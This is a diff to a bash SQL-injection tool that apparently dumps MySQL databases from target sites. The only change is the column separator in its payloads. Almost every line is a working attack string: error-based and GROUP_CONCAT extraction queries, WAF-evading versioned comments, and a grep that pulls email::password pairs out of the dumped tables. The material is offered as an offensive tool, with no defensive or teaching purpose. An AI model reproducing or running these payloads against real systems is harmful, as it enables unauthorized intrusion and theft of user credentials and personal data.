@@ -1343,7 +1343,7 @@ edump () {
               then
                  if cat .table | grep -Po "$cor" >/dev/null
                  then
-                    colom=$(echo "$co" | sed 's/,/,0x3a3a,/g')
+                    colom=$(echo "$co" | sed 's/,/,0x7c,/g')
                     echo "$cor $colom"
                     if [[ "$waff"  = "on" ]];then 
                        dump="+AND+/**8**/(SELECT+1+/*!50000FROM*/+(SELECT+COUNT(*),/*!50000CONCAT*//**8**/((SELECT(SELECT+/*!50000CONCAT*//**8**/(CAST(/*!50000CONCAT*//**8**/($colom)+AS+CHAR),0x7e))+/*!50000FROM*/+$db_na.$table+LIMIT+$roy,1),FLOOR(RAND(0)*2))x+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA.TABLES*/+/*!50000GROUP*/+/*!50000BY*/+x)a)--+"
@@ -1353,7 +1353,7 @@ edump () {
                     echo -e "${O}\033[2mpastikan nama yg dimasukan sudah sesuai${N}"
                     echo -e "${O}Query: ${N}\033[2m$site$dump${N}"
                     echo -e "${N}retrived_db: ${G}mysql@$db/$db_na/$table${N}~"
-                    echo -e "+$coi+\n \033[0;36m$colom${N}\n+$coi+$O" | sed 's/,0x3a3a,/ :: /g'
+                    echo -e "+$coi+\n \033[0;36m$colom${N}\n+$coi+$O" | sed 's/,0x7c,/ :: /g'
                     trap break INT
                     for roy in $(seq 50)
                     do 
@@ -2041,8 +2041,8 @@ dump() {
           if [[ "$boot_empas" = "y" ]];then
           	         for table in $(cat .table | sort -u | uniq -i | grep -aP "$auto_get" | cut -d ":" -f1 | uniq -i)
           	         do 
-                          colon=$(cat .table | sort -u | uniq -i | grep -aP "$table" | cut -d ":" -f3 | grep -aP "$auto_get" | uniq -i | sed '/^[[:blank:]]*$/d' | sed ':a;N;$!ba;s/\n/,0x3a3a,/g')
-                          echo -e "${G}\033[2mDump table name ${N}: $table\n${G}\033[2mDump colom name ${N}: $colon" | sed "s/,0x3a3a,/,/g"
+                          colon=$(cat .table | sort -u | uniq -i | grep -aP "$table" | cut -d ":" -f3 | grep -aP "$auto_get" | uniq -i | sed '/^[[:blank:]]*$/d' | sed ':a;N;$!ba;s/\n/,0x7c,/g')
+                          echo -e "${G}\033[2mDump table name ${N}: $table\n${G}\033[2mDump colom name ${N}: $colon" | sed "s/,0x7c,/,/g"
                           if [[ "$dump_sqli" = "y" ]];then
                              Dump="(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM($db_na.$table)WHERE(@x)IN(@x:=CONCAT(0x20,@x,0x3c6c693e,${colon},0x3c6c693e))))x)"
                              Dump1="(SELECT+GROUP_CONCAT(0x3c6c693e,${colon},0x3c6c693e)+FROM+$db_na.$table)"
@@ -2142,7 +2142,7 @@ dump() {
                                c=$(cat output/$dir/dump-$table.txt | awk -F "${char}" '{print NF-1}' | sort -rn | uniq -i | head -1)
                                coi=$(seq -s '-' $c | sed 's/[0-9]//g')
                                echo -en "${N}retrived_db: ${G}mysql@$dbdir/$db_na/$table${N}~\n"
-                               echo -e "+$coi+\n $colon \n+$coi+$O" | sed 's/,0x3a3a,/ :: /g'
+                               echo -e "+$coi+\n $colon \n+$coi+$O" | sed 's/,0x7c,/ :: /g'
                                echo -e "$O$cury" | sort -u | uniq -i
                                echo -en "${N}+$coi+\n"
                                if cat output/$dir/dump-$table.txt | grep -a -o '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*::[[:alnum:]+\.\_\-\]*' >/dev/null
@@ -2215,7 +2215,7 @@ dump() {
                     then
                        if cat .table | grep -Po "$cor" >/dev/null
                        then
-                          colon=$(echo $co | sed 's/,/,0x3a3a,/g')
+                          colon=$(echo $co | sed 's/,/,0x7c,/g')
                           if [[ "$dump_sqli" = "y" ]];then
                              Dump="(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM($db_na.$table)WHERE(@x)IN(@x:=CONCAT(0x20,@x,0x3c6c693e,${colon},0x3c6c693e))))x)"
                              Dump1="(SELECT+GROUP_CONCAT(0x3c6c693e,${colon},0x3c6c693e)+FROM+$db_na.$table)"
